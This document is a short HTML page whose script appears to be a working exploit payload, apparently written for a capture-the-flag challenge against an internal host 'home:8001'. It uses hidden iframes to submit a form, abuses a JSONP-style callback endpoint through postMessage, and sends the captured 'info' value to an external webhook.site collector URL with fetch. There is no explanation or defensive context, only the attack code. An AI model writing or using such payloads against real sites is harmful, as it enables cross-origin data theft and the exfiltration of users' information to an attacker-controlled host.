<!doctype html>
<html>
<body>
<script>
const hook = 'https://webhook.site/213f2418-6a4f-4932-81f0-90124113fa54?f=';

function leak(x){ fetch(hook + encodeURIComponent(x)).catch(()=>{}); }

function step2(){
  window.addEventListener('message', ev => {
    if (ev.data && ev.data.info) leak(ev.data.info);
  });
  const cb = document.createElement('iframe');
  cb.style.display = 'none';
  cb.src = 'http://home:8001/callback?callback=parent.postMessage';
  document.body.appendChild(cb);
}

(function(){
  const fr = document.createElement('iframe');
  fr.style.display = 'none';
  fr.src = 'http://home:8001/post';
  fr.onload = () => {
    try { fr.contentWindow.document.forms[0].submit(); } catch(e){}
    setTimeout(step2, 1000);
  };
  document.body.appendChild(fr);
})();
</script>
</body>
</html>
